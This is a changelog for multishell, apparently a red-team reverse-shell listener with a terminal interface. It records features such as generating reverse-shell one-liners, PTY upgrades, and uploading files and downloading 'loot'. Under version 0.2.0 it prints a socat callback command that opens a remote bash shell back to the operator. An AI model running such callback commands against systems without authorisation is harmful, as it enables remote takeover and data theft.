# Changelog

All notable changes to multishell are documented in this file.
Format: [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
versioning: [SemVer](https://semver.org/spec/v2.0.0.html).

## [0.3.0] — 2026-05-07

### Added
- **`/payload <kind>`** — prints a reverse-shell one-liner pre-stamped with
  the listener's `host:port` directly into the scrollback. Supported kinds:
  `bash`, `sh`, `python`, `nc`, `perl`, `ruby`, `powershell`. Eliminates
  the "wait, what's the bash one again?" moment. New module:
  `src/multishell/payloads.py`.
- **Operator banner** in the scrollback when no session is selected:
  ASCII header, listener address, data dir, live/archived counts, key +
  slash cheatsheet. Re-renders whenever the last session is killed.
- **`Esc`** as an alias for quit (alongside `Ctrl+Q`). Modal screens
  continue to use `Esc` for dismiss/cancel.
- **TERM / `NO_COLOR` fallback** — custom theme registration is skipped
  when running on a dumb terminal so a stripped-down SSH session still
  launches cleanly.
- **tmux / screen detection** — when running inside a multiplexer, the
  banner surfaces a tip noting that the multishell keys don't collide
  with the mux prefix and that raw-interact (`Ctrl+G`) needs a real tty.
- **Self-bootstrapping `run.sh`** — on a fresh checkout, `./run.sh`
  creates `.venv/`, installs in editable mode, and launches. Designed
  for the "SSH to a fresh box, clone, run inside tmux" flow.
- **Friendly port-in-use error** — pre-flight bind check in
  `__main__.py`. Conflicts now print a one-line hint instead of a
  Textual traceback.

### Fixed
- **Removed sessions resurrected on next startup** — `SessionRegistry.remove()`
  used to drop sessions from memory while leaving `.log`, `.cast`, and
  `.meta.json` files behind, so `load_history()` reloaded them on every
  launch. New `Session.delete_archive()` now unlinks the on-disk artifacts;
  `/kill` and `/prune` actually delete. Regression test added.

### Changed
- README: new "Clone and run" + "Running over SSH / inside tmux or screen"
  sections; clone path updated to `syndis/Monkey-Business`.
- `pyproject.toml`: author email + project URLs updated to Syndis.

## [0.2.0] — 2026-04-25

### Added
- **Raw-interact mode** (`Ctrl+G` or `/raw`) — suspends Textual, drops the
  local tty into `cfmakeraw`, and runs a stdin↔socket bridge so `vim`,
  `htop`, tab completion, shell history, and `Ctrl+C` all work normally
  inside the remote session. Press `Ctrl+G` again to return to the TUI.
  New module: `src/multishell/raw_interact.py`.
- **Callback-PTY reconnect** (`/pty --reconnect [host:port]`) — instead
  of wrapping the existing dumb shell in-place, fires a fire-and-forget
  payload (`socat tcp:H:P exec:/bin/bash,pty,stderr,setsid,sigint,sane`,
  with python3/python fallbacks, all detached via `(... &)`) that lands
  as a brand-new session with a clean PTY. New helper:
  `multishell.fingerprint.callback_pty_payload()`.
- Two new palette entries: "Reconnect with fresh PTY", "Raw interact (Ctrl+G)".

### Changed
- `pty_upgrade_payload()` is now the *in-place* strategy explicitly;
  `callback_pty_payload()` is the fresh-socket alternative.

## [0.1.0] — 2026-04-24

Initial release.

### Core
- Multi-TCP listener (`asyncio.start_server`) with DoS guard (`MAX_CONCURRENT_SESSIONS`)
- `SessionRegistry` with `on_add` / `on_data` / `on_close` / `on_remove` callbacks
- Per-session scrollback ring buffer (10,000 chunks) preserved across session switches
- Per-session `asyncio.Lock` on `send()` — serialized writes prevent byte-level interleaving

### Textual TUI
- Custom "hacker" theme (registered via `textual.theme.Theme` — cyan/phosphor/amber/hot-pink)
- Sidebar DataTable with session ID / host / OS / status / uptime
- Structured fingerprint info panel (USER / OS / SHELL / CWD / note)
- Integrated prompt row — borderless Input with session-aware prefix (`tag ❯`)
- Command palette (`Ctrl+K`) with 10 static actions + dynamic session switches
- Global regex scrollback search (`Ctrl+F`)
- Rename / tag (`F2` / `Ctrl+T`) and sticky notes (`Ctrl+O`) — both persisted to disk
- Kill session (`Ctrl+X`) + `/prune` for bulk cleanup

### Target interaction
- Auto-fingerprint on connect (OS / user / hostname / shell / cwd, sentinel-delimited probe)
- Bulletproof PTY upgrade: `python3` → `python` → `script` with OS-branched syntax
  (BSD/Darwin vs Linux `script(1)` differ) and post-upgrade sentinel verification
- `/pty [shell]` lets you pick the shell explicitly
- `/put <local> [remote]` — base64 heredoc upload with `sha256` verify, sentinel framing
- `/get <remote>` — base64 stdout download, stored in `~/.multishell/loot/session-NNNN/`

### Persistence & evidence
- asciinema v2 `.cast` recording per session (replay with `asciinema play`)
- Raw byte log per session
- Metadata sidecar (`.meta.json`) — tag, note, fingerprint; edits persist across restarts
- `SessionRegistry.load_history()` loads up to 50 most-recent archived sessions on startup
- Archive load capped at 10 MB per log file (prevents OOM on previous big exfils)
- Data directory permissions tightened to `chmod 700`; per-file logs `chmod 600`

### CLI
- `-p / --port`, `-b / --bind`, `--no-history`, `-V / --version`

### Documentation
- `docs/REVERSE_SHELLS.md` — 15-section cheat sheet (bash, nc, python, PHP, Go, PowerShell,
  Flask SSTI, LOLBins, msfvenom, encoding tricks, session stabilization, blue-team signals)
